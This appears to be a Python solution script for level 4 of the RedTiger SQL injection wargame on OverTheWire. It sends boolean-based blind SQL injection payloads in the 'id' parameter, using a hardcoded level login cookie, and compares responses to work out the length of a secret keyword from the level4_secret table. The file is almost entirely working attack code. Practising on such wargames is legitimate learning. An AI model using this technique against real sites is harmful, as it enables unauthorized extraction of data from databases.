import requests

requests.packages.urllib3.disable_warnings()

url = "http://redtiger.labs.overthewire.org/level4.php"
cookies = {
    "level4login":"put_the_kitten_on_your_head"
}

n = 0
bef_ret = ''
for i in range(24):
    params = {
        "id": "1 and 1=(select length(keyword)=%s from level4_secret)" % str(i)
    }
    print("1 and 1=(select length(keyword)=%s from level4_secret)" % str(i))
    r = requests.post(url, cookies=cookies, params=params, verify=False)
    if bef_ret != r.content:
        print(r.content)
    bef_ret = r.content
